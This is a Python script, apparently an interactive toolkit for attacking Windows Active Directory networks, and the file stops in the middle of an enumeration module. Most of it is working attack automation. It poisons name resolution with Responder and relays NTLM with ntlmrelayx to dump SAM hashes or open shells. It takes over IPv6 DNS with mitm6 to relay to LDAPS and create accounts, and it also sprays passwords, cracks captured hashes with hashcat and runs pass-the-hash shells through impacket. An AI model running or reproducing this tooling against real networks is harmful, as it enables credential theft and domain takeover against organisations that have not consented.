#!/usr/bin/env python3

import os
import sys
import subprocess
import time
import signal
import re
import select
import pty
import curses
import socket
import shutil
from datetime import datetime

LOOT_DIR = os.path.join(os.getcwd(), f"AD_ENUM_loot_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)
    os.chmod(LOOT_DIR, 0o777)

CURRENT_IFACE = ""
RESPONDER_CONF = "/etc/responder/Responder.conf"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

class Colors:
    RED     = '\033[0;31m'
    GREEN   = '\033[0;32m'
    YELLOW  = '\033[1;33m'
    BLUE    = '\033[0;34m'
    CYAN    = '\033[0;36m'
    WHITE   = '\033[1;37m'
    NC      = '\033[0m'

FULL_WIDTH = 80
H_BAR = '═' * (FULL_WIDTH - 2)
HDR_TOP = f"{Colors.CYAN}╔{H_BAR}╗{Colors.NC}"
HDR_MID = f"{Colors.CYAN}╠{H_BAR}╣{Colors.NC}"
HDR_BOT = f"{Colors.CYAN}╚{H_BAR}╝{Colors.NC}"

BOX_TL  = "╭"
BOX_TR  = "╮"
BOX_BL  = "╰"
BOX_BR  = "╯"
BOX_H   = "─"
BOX_V   = "│"
BOX_T_L = "├"
BOX_T_R = "┤"
BOX_SEP = "─"

def check_root():
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] This script must be run as ROOT.{Colors.NC}")
        sys.exit(1)

def check_tools():
    tools = ["impacket-ntlmrelayx", "responder", "nmap", "nc", "hashcat", "mitm6", "netexec"]
    missing = []
    for tool in tools:
        if not shutil.which(tool):
            if tool == "impacket-ntlmrelayx" and shutil.which("ntlmrelayx.py"): continue
            if tool == "netexec" and (shutil.which("crackmapexec") or shutil.which("nxc")): continue
            missing.append(tool)
    if missing:
        print(f"{Colors.RED}[!] Missing tools: {', '.join(missing)}{Colors.NC}")
        print(f"{Colors.YELLOW}[*] Please install them (e.g., apt install netexec responder mitm6){Colors.NC}")
        sys.exit(1)

def cleanup_ports():
    print(f"{Colors.BLUE}[*] Cleaning up ports and killing conflicting processes...{Colors.NC}")
    ports = [80, 443, 445, 11000, 11001]
    for port in ports:
        try:
            pid_data = subprocess.check_output(f"lsof -t -i:{port}", shell=True, stderr=subprocess.DEVNULL).decode().strip()
            if pid_data:
                for pid in pid_data.split('\n'):
                    os.kill(int(pid), signal.SIGKILL)
        except: pass
    subprocess.run("pkill -9 -f responder", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -9 -f ntlmrelayx", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -9 -f mitm6", shell=True, stderr=subprocess.DEVNULL)
    time.sleep(1)

def modify_responder_conf(enable_smb_http=True):
    if not os.path.exists(RESPONDER_CONF): return
    state = "On" if enable_smb_http else "Off"
    try:
        with open(RESPONDER_CONF, 'r') as f: content = f.read()
        content = re.sub(r'(?i)^\s*SMB\s*=\s*(On|Off)', f'SMB = {state}', content, flags=re.MULTILINE)
        content = re.sub(r'(?i)^\s*HTTP\s*=\s*(On|Off)', f'HTTP = {state}', content, flags=re.MULTILINE)
        with open(RESPONDER_CONF, 'w') as f: f.write(content)
    except: pass

def strip_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    text = ansi_escape.sub('', text)
    return text.replace('\r', '')

def get_input(prompt, default=None):
    text = f"{Colors.WHITE}{prompt}{Colors.NC}"
    if default: text += f" [{Colors.YELLOW}{default}{Colors.NC}]"
    text += ": "
    val = input(text)
    return val if val else default

def check_port_open(ip, port, timeout=2.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, int(port)))
        s.close()
        return True
    except:
        return False

def select_interface():
    global CURRENT_IFACE
    print(f"\n{Colors.BLUE}[*] Detecting Interfaces...{Colors.NC}")
    
    try:
        res = subprocess.check_output("ip -o link show", shell=True).decode()
        ifaces_list = []
        
        candidates = []
        for line in res.split('\n'):
            if ": " in line and "lo" not in line:
                parts = line.split(": ")
                if len(parts) >= 2: 
                    candidates.append(parts[1].split("@")[0])
        
        for iface in candidates:
            ip = "No IP"
            try:
                ip_out = subprocess.check_output(f"ip -4 addr show {iface}", shell=True).decode()
                m = re.search(r"inet ([\d.]+)", ip_out)
                if m: ip = m.group(1)
            except: pass
            ifaces_list.append((iface, ip))

        if not ifaces_list: 
            print(f"{Colors.RED}[!] No network interfaces found.{Colors.NC}")
            return

        max_iface = max([len(i[0]) for i in ifaces_list] + [9])
        max_ip = max([len(i[1]) for i in ifaces_list] + [10])
        
        w_id = 4
        w_iface = max_iface + 4
        w_ip = max_ip + 4
        
        print(f"  {Colors.CYAN}{BOX_TL}{BOX_H * w_id}{BOX_H}{BOX_H * w_iface}{BOX_H}{BOX_H * w_ip}{BOX_TR}{Colors.NC}")
        print(f"  {Colors.CYAN}{BOX_V}{Colors.NC} {Colors.WHITE}{'ID':<{w_id-1}}{Colors.NC}{Colors.CYAN}{BOX_V}{Colors.NC} {Colors.GREEN}{'INTERFACE':<{w_iface-1}}{Colors.NC}{Colors.CYAN}{BOX_V}{Colors.NC} {Colors.YELLOW}{'IP ADDRESS':<{w_ip-1}}{Colors.NC}{Colors.CYAN}{BOX_V}{Colors.NC}")
        print(f"  {Colors.CYAN}{BOX_T_L}{BOX_H * w_id}{BOX_SEP}{BOX_H * w_iface}{BOX_SEP}{BOX_H * w_ip}{BOX_T_R}{Colors.NC}")

        default_choice = "1"
        for idx, (name, ip) in enumerate(ifaces_list, 1):
            if ip != "No IP": default_choice = str(idx)
            print(f"  {Colors.CYAN}{BOX_V}{Colors.NC} {str(idx):<{w_id-1}}{Colors.CYAN}{BOX_V}{Colors.NC} {Colors.WHITE}{name:<{w_iface-1}}{Colors.NC}{Colors.CYAN}{BOX_V}{Colors.NC} {ip:<{w_ip-1}}{Colors.CYAN}{BOX_V}{Colors.NC}")

        print(f"  {Colors.CYAN}{BOX_BL}{BOX_H * w_id}{BOX_H}{BOX_H * w_iface}{BOX_H}{BOX_H * w_ip}{BOX_BR}{Colors.NC}")

        c = get_input(f"\n{Colors.CYAN}[?]{Colors.NC} Select Interface", default_choice)
        try: 
            selection = int(c) - 1
            if 0 <= selection < len(ifaces_list):
                CURRENT_IFACE = ifaces_list[selection][0]
            else:
                CURRENT_IFACE = ifaces_list[0][0]
        except: 
            CURRENT_IFACE = ifaces_list[0][0]
            
        print(f"{Colors.BLUE}[*] Selected: {CURRENT_IFACE}{Colors.NC}\n")

    except Exception as e: 
        print(f"{Colors.RED}[!] Error detecting interfaces: {e}{Colors.NC}")

def run_live(command, logfile_path):
    if isinstance(command, list):
        command = " ".join(command)
        
    print(f"\n{Colors.YELLOW}[CMD] {command}{Colors.NC}")
    
    env = os.environ.copy()
    env["LDAPTLS_REQCERT"] = "never"

    with open(logfile_path, "wb") as f:
        master, slave = pty.openpty()
        process = subprocess.Popen(command, shell=True, stdout=slave, stderr=slave, close_fds=True, env=env)
        os.close(slave)
        try:
            while True:
                r, _, _ = select.select([master], [], [], 0.1)
                if r:
                    try:
                        data = os.read(master, 1024)
                    except OSError:
                        break 
                    
                    if not data: break
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
                    f.write(data)
                elif process.poll() is not None: break
        except KeyboardInterrupt:
            process.send_signal(signal.SIGINT)
        finally:
            os.close(master)
    input(f"\n{Colors.WHITE}Press Enter to return...{Colors.NC}")

def auto_crack_stream_hash(hash_str, hash_type):
    hash_file = os.path.join(LOOT_DIR, "captured.hash")
    with open(hash_file, "w") as f: f.write(hash_str)
    mode = "1000"
    if "NTLMv2" in hash_type: mode = "5600"
    elif "NTLMv1" in hash_type: mode = "5500"
    cmd = f"hashcat -m {mode} -a 0 '{hash_file}' '{WORDLIST}' --force --show"
    try:
        subprocess.run(cmd.replace("--show", ""), shell=True)
        print(f"\n{Colors.GREEN}[+] CRACKING RESULT:{Colors.NC}")
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"{Colors.RED}[!] Hashcat failed: {e}{Colors.NC}")
    input(f"\n{Colors.YELLOW}[*] Press Enter to return to monitoring...{Colors.NC}")

def detect_hash_mode_file(hash_file):
    try:
        with open(hash_file, 'r', encoding='utf-8', errors='ignore') as f:
            sample = f.readline().strip()
    except Exception as e:
        return None
    if not sample: return None
    if "$krb5asrep$" in sample: return "18200" 
    if "$krb5tgs$" in sample: return "13100"    
    if "::" in sample and len(sample) > 50: return "5600" 
    if re.fullmatch(r"[a-fA-F0-9]{32}", sample) or sample.startswith("$NT$"): return "1000" 
    if "$DCC2$" in sample: return "2100" 
    return None

def module_crack_hashes():
    print(f"\n{Colors.CYAN}--- ROBUST HASH CRACKER ---{Colors.NC}")
    print(f"1. Load from File")
    print(f"2. Type/Paste Hash")
    method = get_input("Select Method", "1")
    target_file = ""
    if method == "2":
        print(f"\n{Colors.YELLOW}[*] Paste your hash below and press Enter:{Colors.NC}")
        hash_str = input().strip()
        if not hash_str: return
        target_file = os.path.join(LOOT_DIR, "pasted_hash.txt")
        with open(target_file, "w") as f: f.write(hash_str)
        print(f"{Colors.BLUE}[*] Saved to temp file: {target_file}{Colors.NC}")
    else:
        raw_path = get_input("Path to hash file")
        if not raw_path: return
        target_file = raw_path.strip().strip("'").strip('"')
        if not os.path.exists(target_file):
            print(f"{Colors.RED}[!] File not found: {target_file}{Colors.NC}")
            return
    
    wordlist = get_input("Wordlist", WORDLIST)
    print(f"{Colors.BLUE}[*] Auto-detecting hash mode...{Colors.NC}")
    mode = detect_hash_mode_file(target_file)
    if mode: print(f"{Colors.GREEN}[+] Detected Mode: {mode}{Colors.NC}")
    else:
        print(f"{Colors.YELLOW}[!] Could not auto-detect.{Colors.NC}")
        mode = get_input("Enter Hashcat Mode manually")
    
    cmd = ["hashcat", "-m", mode, "-a", "0", target_file, wordlist, "--status"]
    print(f"\n{Colors.BLUE}[*] Starting Hashcat (Press 's' for status, 'q' to quit)...{Colors.NC}")
    try:
        subprocess.call(cmd)
        print(f"\n{Colors.GREEN}[*] Checking for cracked passwords...{Colors.NC}")
        subprocess.call(["hashcat", "-m", mode, target_file, wordlist, "--show"])
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted.{Colors.NC}")
    input(f"\n{Colors.WHITE}Press Enter to return...{Colors.NC}")

def safe_addstr(pad, text, color_pair):
    try: pad.addstr(text, color_pair)
    except curses.error: pass

def module_attack_advisor():
    print(f"\n{Colors.CYAN}--- ATTACK ADVISOR (SMART) ---{Colors.NC}")
    target = get_input("Enter Target IP/Domain")
    if not target: return

    print(f"\n{Colors.BLUE}[*] Scanning key ports on {target}...{Colors.NC}")

    vectors = []

    if check_port_open(target, 445):
        print(f"{Colors.GREEN}[+] Port 445 (SMB) is OPEN{Colors.NC}")
        print(f"{Colors.BLUE}    [*] Checking SMB Signing status (requires nmap)...{Colors.NC}")
        try:
            nmap_out = subprocess.check_output(f"nmap -p 445 --script smb2-security-mode {target} -Pn", shell=True, stderr=subprocess.DEVNULL).decode()
            if "message signing enabled but not required" in nmap_out:
                vectors.append((f"{Colors.GREEN}SMB RELAY VULNERABLE{Colors.NC}", "Target does not require signing. Use Module 3 (SMB Relay)."))
            elif "message signing enabled and required" in nmap_out:
                vectors.append((f"{Colors.YELLOW}SMB SIGNING ENFORCED{Colors.NC}", "Relay will fail. Use Module 4 (Password Spray) or Module 5 (Impacket)."))
            else:
                 vectors.append(("SMB Detected", "Could not determine signing. Try Relay first."))
        except:
            vectors.append(("SMB Detected", "Nmap check failed. Assuming open."))
    
    if check_port_open(target, 389):
        print(f"{Colors.GREEN}[+] Port 389 (LDAP) is OPEN{Colors.NC}")
        vectors.append(("IPv6 DNS Takeover", "LDAP is open. This is the primary target for Module 6 (IPv6/mitm6)."))

    if check_port_open(target, 88):
        print(f"{Colors.GREEN}[+] Port 88 (Kerberos) is OPEN{Colors.NC}")
        vectors.append(("Kerberoasting / AS-REP", "User enumeration and roasting attacks possible (Module 7)."))

    if check_port_open(target, 5985):
        print(f"{Colors.GREEN}[+] Port 5985 (WinRM) is OPEN{Colors.NC}")
        vectors.append(("Evil-WinRM", "If you find credentials, use 'evil-winrm' for a stable shell."))

    print(f"\n{Colors.CYAN}--- RECOMMENDATIONS ---{Colors.NC}")
    if not vectors:
        print(f"{Colors.RED}[-] No AD-specific vectors found.{Colors.NC}")
    else:
        for title, desc in vectors:
            print(f"{Colors.YELLOW}-> {title}{Colors.NC}")
            print(f"   {desc}")
    
    input(f"\n{Colors.WHITE}Press Enter to return...{Colors.NC}")

def module_responder():
    if not CURRENT_IFACE: select_interface()
    cleanup_ports()
    modify_responder_conf(enable_smb_http=True)
    run_live(f"responder -I {CURRENT_IFACE} -dwv", os.path.join(LOOT_DIR, "responder.log"))

def draw_smb_interface(stdscr, p_resp_master, p_relay_stdout, initial_relay_logs, targets, relay_mode):
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_CYAN, -1)
    curses.init_pair(2, curses.COLOR_GREEN, -1)
    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLUE)
    curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_RED)
    stdscr.nodelay(True)
    height, width = stdscr.getmaxyx()
    pad_resp = curses.newpad(10000, (width // 2) - 2)
    pad_resp.scrollok(True)
    pad_relay = curses.newpad(10000, (width // 2) - 2)
    pad_relay.scrollok(True)
    for line in initial_relay_logs: safe_addstr(pad_relay, f"{line.strip()}\n", curses.color_pair(2))
    readers = [p_resp_master, p_relay_stdout]
    shell_info_msg = None
    
    while True:
        try:
            nh, nw = stdscr.getmaxyx()
            if nh != height or nw != width:
                height, width = nh, nw
                stdscr.clear()
            stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
            stdscr.addstr(0, 0, " SMB RELAY ATTACK - LIVE MONITOR ".center(width)[:width], curses.A_REVERSE)
            info = f" Interface: {CURRENT_IFACE} | Targets: {len(targets)} "
            stdscr.addstr(1, 0, info.center(width)[:width])
            stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
            stdscr.attron(curses.color_pair(3))
            stdscr.addstr(3, 2, "[ RESPONDER ]", curses.A_BOLD)
            stdscr.addstr(3, (width // 2) + 2, "[ RELAY ]", curses.A_BOLD)
            for y in range(3, height - 2): stdscr.addch(y, width // 2, curses.ACS_VLINE)
            stdscr.attroff(curses.color_pair(3))
            if shell_info_msg:
                stdscr.attron(curses.color_pair(4) | curses.A_BOLD | curses.A_BLINK)
                stdscr.addstr(height-2, 0, shell_info_msg.center(width)[:width])
                stdscr.attroff(curses.color_pair(4) | curses.A_BOLD | curses.A_BLINK)
            else:
                status_bar = " Running... (Ctrl+C to Stop) "
                stdscr.addstr(height-2, 2, status_bar, curses.A_REVERSE)
            
            stdscr.refresh()
            rlist, _, _ = select.select(readers, [], [], 0.05)
            for stream in rlist:
                if stream == p_resp_master:
                    data = os.read(p_resp_master, 4096)
                    if not data: readers.remove(p_resp_master); continue
                    text = strip_ansi(data.decode('utf-8', errors='ignore'))
                    if "Hash" in text and "NTLM" in text:
                        curses.endwin()
                        print(f"\n{Colors.RED}[!] HASH DETECTED!{Colors.NC}")
                        c = input(f"{Colors.YELLOW}Crack this hash? (y/n): {Colors.NC}")
                        if c.lower() == 'y':
                            try:
                                logs = [f for f in os.listdir("/usr/share/responder/logs/") if f.endswith(".txt")]
                                if logs:
                                    latest = max([os.path.join("/usr/share/responder/logs/", f) for f in logs], key=os.path.getmtime)
                                    with open(latest, 'r') as f:
                                        content = f.read()
                                        matches = re.findall(r"(admin::.*|.*::.*:.*:.*:.*)", content)
                                        if matches: auto_crack_stream_hash(matches[-1], "NTLMv2")
                            except: pass
                            input("Press Enter to resume...")
                        stdscr.refresh()
                    for line in text.split('\n'):
                        if line.strip(): safe_addstr(pad_resp, f"{line.strip()}\n", curses.color_pair(1))
                    view_h = height - 6
                    cy, _ = pad_resp.getyx()
                    prefresh_y = max(0, cy - view_h)
                    pad_resp.refresh(prefresh_y, 0, 4, 1, height-3, (width//2)-1)
                elif stream == p_relay_stdout:
                    line = p_relay_stdout.readline()
                    if not line: readers.remove(p_relay_stdout); continue
                    clean_line = strip_ansi(line.strip())
                    if relay_mode == "2":
                        if "via TCP on" in clean_line and "127.0.0.1" in clean_line:
                            match = re.search(r'([\d\.]+:\d+)', clean_line)
                            if match:
                                addr = match.group(1).replace(':', ' ')
                                shell_info_msg = f" !!! SHELL OPENED !!! Run: nc {addr} "
                    if clean_line: safe_addstr(pad_relay, f"{clean_line}\n", curses.color_pair(2))
                    view_h = height - 6
                    cy, _ = pad_relay.getyx()
                    prefresh_y = max(0, cy - view_h)
                    pad_relay.refresh(prefresh_y, 0, 4, (width//2)+1, height-3, width-2)
        except curses.error: pass

def module_smb_relay():
    if not CURRENT_IFACE: select_interface()
    try:
        ip_out = subprocess.check_output(f"ip -4 addr show {CURRENT_IFACE}", shell=True).decode()
        my_ip = re.search(r"inet ([\d.]+)", ip_out).group(1)
        base_net = ".".join(my_ip.split('.')[:3]) + ".0/24"
    except: base_net = "192.168.1.0/24"
    print(f"{Colors.BLUE}[*] Target Network: {base_net}{Colors.NC}")
    net = get_input("Enter Network", base_net)
    print(f"{Colors.BLUE}[*] Scanning for vulnerable hosts (this may take a moment)...{Colors.NC}")
    cmd_nmap = f"nmap -p 445 --script smb2-security-mode {net} -Pn"
    try: nmap_out = subprocess.check_output(cmd_nmap, shell=True).decode()
    except: return
    valid_targets = []
    hosts = nmap_out.split("Nmap scan report for")
    for host_block in hosts[1:]:
        if "message signing enabled but not required" in host_block.lower():
            ip_match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", host_block.split('\n')[0])
            if ip_match: valid_targets.append(ip_match.group(1))
    
    if not valid_targets:
        print(f"{Colors.RED}[-] No vulnerable targets found.{Colors.NC}")
        input("Press Enter..."); return
    
    print(f"\n{Colors.GREEN}[+] FOUND {len(valid_targets)} VULNERABLE TARGETS:{Colors.NC}")
    for t in valid_targets:
        print(f"    {Colors.CYAN}-> {t}{Colors.NC}")
    print("")

    t_file = os.path.join(LOOT_DIR, "targets.txt")
    with open(t_file, 'w') as f:
        for t in valid_targets: f.write(t + "\n")
    
    cleanup_ports()
    modify_responder_conf(enable_smb_http=False)
    tool_name = "impacket-ntlmrelayx" if shutil.which("impacket-ntlmrelayx") else "ntlmrelayx.py"
    relay_cmd = [tool_name, "-tf", t_file, "-smb2support"]
    print(f"\n{Colors.CYAN}1. Dump SAM (Default){Colors.NC}")
    print(f"{Colors.CYAN}2. Interactive Shell (-i){Colors.NC}")
    print(f"{Colors.CYAN}3. Custom Command (-c){Colors.NC}")
    c = get_input("Choice", "1")
    if c == "2": relay_cmd.append("-i")
    elif c == "3": 
        cmd = get_input("Enter Command")
        relay_cmd.extend(["-c", cmd])
    print(f"{Colors.BLUE}[*] Initializing Relay...{Colors.NC}")
    p_relay = subprocess.Popen(relay_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    initial_logs = []
    start_time = time.time()
    while time.time() - start_time < 10:
        r, _, _ = select.select([p_relay.stdout], [], [], 1.0)
        if r:
            line = p_relay.stdout.readline()
            initial_logs.append(line)
            if "Running in relay mode" in line or "Listening on" in line: break
        if p_relay.poll() is not None:
            print(f"{Colors.RED}[!] Relay crashed.{Colors.NC}")
            modify_responder_conf(enable_smb_http=True)
            return
    print(f"{Colors.GREEN}[+] Relay Ready. Launching UI...{Colors.NC}")
    master_resp, slave_resp = pty.openpty()
    p_resp = subprocess.Popen(["responder", "-I", CURRENT_IFACE, "-dPv"], stdout=slave_resp, stderr=slave_resp, close_fds=True)
    os.close(slave_resp)
    try: curses.wrapper(draw_smb_interface, master_resp, p_relay.stdout, initial_logs, valid_targets, c)
    except KeyboardInterrupt: pass
    finally:
        p_resp.terminate()
        p_relay.terminate()
        os.close(master_resp)
        cleanup_ports()
        modify_responder_conf(enable_smb_http=True)
        print(f"\n{Colors.GREEN}[+] Finished. Loot: {LOOT_DIR}{Colors.NC}")
        input("Press Enter...")

def module_password_spray():
    print(f"\n{Colors.CYAN}--- PASSWORD SPRAYING (NetExec) ---{Colors.NC}")
    
    tool = "netexec"
    if shutil.which("nxc"): tool = "nxc"
    elif shutil.which("netexec"): tool = "netexec"
    elif shutil.which("crackmapexec"): tool = "crackmapexec"
    else:
        print(f"{Colors.RED}[!] NetExec/CrackMapExec not found. Install it first.{Colors.NC}")
        return

    target = get_input(f"Target IP/Subnet (e.g. 192.168.1.10 or 192.168.1.0/24)")
    if not target: return

    print(f"\n{Colors.BLUE}[*] Username Configuration:{Colors.NC}")
    print("1. Single Username")
    print("2. Usernames File")
    u_choice = get_input("Choice", "1")
    
    u_cmd = ""
    if u_choice == "2":
        path = get_input("Path to users file", os.path.join(LOOT_DIR, "users.txt"))
        path = path.strip().strip("'").strip('"')
        if not os.path.exists(path):
            print(f"{Colors.RED}[!] File not found.{Colors.NC}")
            return
        u_cmd = f"-u '{path}'"
    else:
        val = get_input("Enter Username")
        u_cmd = f"-u '{val}'"

    print(f"\n{Colors.BLUE}[*] Password Configuration:{Colors.NC}")
    print("1. Single Password")
    print("2. Passwords File")
    p_choice = get_input("Choice", "1")

    p_cmd = ""
    if p_choice == "2":
        path = get_input("Path to passwords file", WORDLIST)
        path = path.strip().strip("'").strip('"')
        if not os.path.exists(path):
            print(f"{Colors.RED}[!] File not found.{Colors.NC}")
            return
        p_cmd = f"-p '{path}'"
    else:
        val = get_input("Enter Password")
        if not val:
            print(f"{Colors.RED}[!] Password is required.{Colors.NC}")
            return
        p_cmd = f"-p '{val}'"

    print(f"\n{Colors.YELLOW}[*] Using tool: {tool.upper()} via SMB protocol{Colors.NC}")
    print(f"{Colors.YELLOW}[*] Mode: --continue-on-success (Finds ALL valid logins){Colors.NC}")
    
    cmd = f"{tool} smb {target} {u_cmd} {p_cmd} --continue-on-success"
    log_path = os.path.join(LOOT_DIR, "spray_results.log")
    run_live(cmd, log_path)

def module_impacket_shell():
    print(f"\n{Colors.CYAN}--- IMPACKET SHELL ---{Colors.NC}")
    target = get_input("Target IP")
    user = get_input("Username", "Administrator")
    
    print("\nAuth Type:")
    print("1. Password")
    print("2. Hash")
    auth_type = get_input("Auth", "1")
    
    print("\nSelect Tool:")
    print("1. psexec")
    print("2. wmiexec")
    print("3. smbexec")
    tool_idx = get_input("Tool", "1")
    tool_map = {"1": "impacket-psexec", "2": "impacket-wmiexec", "3": "impacket-smbexec"}
    tool = tool_map.get(tool_idx, "impacket-psexec")
    
    cmd = [tool]
    if auth_type == "2":
        h = get_input("Hash")
        cmd.append(f"-hashes :{h}")
        cmd.append(f"{user}@{target}")
    else:
        p = get_input("Password")
        cmd.append(f"{user}:{p}@{target}")
    
    run_live(" ".join(cmd), os.path.join(LOOT_DIR, "shell.log"))

def draw_ipv6_interface(stdscr, p_mitm6_master, p_relay_stdout, domain, dc_ip):
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_MAGENTA, -1)
    curses.init_pair(2, curses.COLOR_GREEN, -1) 
    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLUE)
    curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_RED)
    curses.init_pair(5, curses.COLOR_BLACK, curses.COLOR_GREEN)

    stdscr.nodelay(True)
    stdscr.keypad(True) 
    height, width = stdscr.getmaxyx()
    
    pad_mitm = curses.newpad(10000, (width // 2) - 2)
    pad_mitm.scrollok(True)
    pad_relay = curses.newpad(10000, (width // 2) - 2)
    pad_relay.scrollok(True)
    
    readers = [p_mitm6_master, p_relay_stdout]
    user_created_msg = None
    active_pane = 0 
    auto_scroll = True
    scroll_mitm = 0
    scroll_relay = 0
    
    initial_file_count = len(os.listdir(LOOT_DIR))

    while True:
        try:
            try: key = stdscr.getch()
            except: key = -1

            if key == 9: active_pane = 1 - active_pane
            if key == ord(' '): auto_scroll = True
            if key == curses.KEY_UP:
                auto_scroll = False
                if active_pane == 0: scroll_mitm = max(0, scroll_mitm - 1)
                else: scroll_relay = max(0, scroll_relay - 1)
            if key == curses.KEY_DOWN:
                if active_pane == 0: scroll_mitm += 1
                else: scroll_relay += 1

            nh, nw = stdscr.getmaxyx()
            if nh != height or nw != width:
                height, width = nh, nw
                stdscr.clear()

            stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
            stdscr.addstr(0, 0, " IPv6 DNS TAKEOVER & LDAP RELAY ".center(width)[:width], curses.A_REVERSE)
            info = f" Domain: {domain} | DC: {dc_ip} "
            stdscr.addstr(1, 0, info.center(width)[:width])
            stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)

            h_mitm = "[ MITM6 (DNS Spoofing) ]"
            attr_mitm = curses.color_pair(5) if active_pane == 0 else curses.color_pair(3)
            stdscr.attron(attr_mitm | curses.A_BOLD)
            stdscr.addstr(3, 2, h_mitm)
            stdscr.attroff(attr_mitm | curses.A_BOLD)

            h_relay = "[ NTLMRELAYX (LDAP Relay) ]"
            attr_relay = curses.color_pair(5) if active_pane == 1 else curses.color_pair(3)
            stdscr.attron(attr_relay | curses.A_BOLD)
            stdscr.addstr(3, (width // 2) + 2, h_relay)
            stdscr.attroff(attr_relay | curses.A_BOLD)

            stdscr.attron(curses.color_pair(3))
            for y in range(3, height - 2): stdscr.addch(y, width // 2, curses.ACS_VLINE)
            stdscr.attroff(curses.color_pair(3))

            loot_found = False
            current_files = len(os.listdir(LOOT_DIR))
            if current_files > initial_file_count + 1: loot_found = True
            
            status_msg = " TAB: Switch Pane | UP/DOWN: Scroll | SPACE: Auto-Scroll "
            status_color = curses.A_REVERSE

            if user_created_msg:
                if loot_found: status_msg = f" !!! SUCCESS: {user_created_msg} & LOOT DUMPED !!! "
                else: status_msg = f" !!! SUCCESS: {user_created_msg} !!! "
                status_color = curses.color_pair(4) | curses.A_BOLD | curses.A_BLINK
            elif loot_found:
                status_msg = " !!! LOOT DETECTED IN DIRECTORY! CHECK IT !!! "
                status_color = curses.color_pair(4) | curses.A_BOLD
            
            stdscr.addstr(height-2, 2, status_msg.center(width-4)[:width-4], status_color)
            stdscr.refresh()

            rlist, _, _ = select.select(readers, [], [], 0.05)
            
            for stream in rlist:
                if stream == p_mitm6_master:
                    data = os.read(p_mitm6_master, 4096)
                    if not data: readers.remove(p_mitm6_master); continue
                    text = strip_ansi(data.decode('utf-8', errors='ignore'))
                    for line in text.split('\n'):
                        if line.strip(): safe_addstr(pad_mitm, f"{line.strip()}\n", curses.color_pair(1))
                elif stream == p_relay_stdout:
                    line = p_relay_stdout.readline()
                    if not line: readers.remove(p_relay_stdout); continue
                    clean_line = strip_ansi(line.strip())
                    lower_line = clean_line.lower()
                    if "user" in lower_line and "created" in lower_line:
                        user_created_msg = "USER CREATED"
                        if "username:" in lower_line:
                            parts = clean_line.split("username:")
                            if len(parts) > 1: user_created_msg = f"USER CREATED: {parts[1].strip()}"
                    if clean_line: safe_addstr(pad_relay, f"{clean_line}\n", curses.color_pair(2))

            view_h = height - 6
            def get_render_offset(pad, manual_scroll, is_auto):
                cy, _ = pad.getyx()
                max_scroll = max(0, cy - view_h)
                return max_scroll if is_auto else max(0, min(manual_scroll, max_scroll))

            render_y_mitm = get_render_offset(pad_mitm, scroll_mitm, auto_scroll)
            if auto_scroll: scroll_mitm = render_y_mitm 
            pad_mitm.refresh(render_y_mitm, 0, 4, 1, height-3, (width//2)-1)

            render_y_relay = get_render_offset(pad_relay, scroll_relay, auto_scroll)
            if auto_scroll: scroll_relay = render_y_relay
            pad_relay.refresh(render_y_relay, 0, 4, (width//2)+1, height-3, width-2)

        except curses.error: pass

def module_ipv6():
    print(f"\n{Colors.CYAN}--- IPv6 DNS TAKEOVER & RELAY ---{Colors.NC}")
    if not CURRENT_IFACE: select_interface()
    
    domain = get_input("Target Domain", "corp.local")
    dc_ip = get_input("DC IP Address")
    
    cleanup_ports()
    
    print(f"{Colors.BLUE}[*] Starting MITM6...{Colors.NC}")
    master_mitm, slave_mitm = pty.openpty()
    cmd_mitm = ["mitm6", "-d", domain, "-i", CURRENT_IFACE]
    p_mitm = subprocess.Popen(cmd_mitm, stdout=slave_mitm, stderr=slave_mitm, close_fds=True)
    os.close(slave_mitm)
    
    print(f"{Colors.BLUE}[*] Starting NTLMRELAYX (Auto-Loot Mode)...{Colors.NC}")
    fakewpad = f"fakewpad.{domain}"
    tool_name = "impacket-ntlmrelayx" if shutil.which("impacket-ntlmrelayx") else "ntlmrelayx.py"
    
    cmd_relay = [
        tool_name, 
        "-6", 
        "-t", f"ldaps://{dc_ip}", 
        "-wh", fakewpad, 
        "-l", LOOT_DIR
    ]
    
    p_relay = subprocess.Popen(cmd_relay, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    
    print(f"{Colors.GREEN}[+] Attack Running. Launching UI...{Colors.NC}")
    time.sleep(2)
    
    try:
        curses.wrapper(draw_ipv6_interface, master_mitm, p_relay.stdout, domain, dc_ip)
    except KeyboardInterrupt:
        pass
    finally:
        p_mitm.terminate()
        p_relay.terminate()
        os.close(master_mitm)
        cleanup_ports()
        print(f"\n{Colors.GREEN}[+] Finished. Loot stored in: {LOOT_DIR}{Colors.NC}")
        input("Press Enter...")

def module_enumeration():
    print(f"\n{Colors.CYAN}--- ENUMERATION ---{Colors.NC}")
    target_ip = get_input("Target IP")
    print("\n1. SMB (nmap/smbclient)")
    print("2. LDAP (ldapsearch)")
    print("3. DNS (nslookup)")
    c = get_input("Choice", "1")
    
    if c == "1":
        run_live(f"nmap -p 445 --script=smb-enum-* {target_ip} -Pn", os.path.join(LOOT_DIR, "enum_smb_nmap.log"))
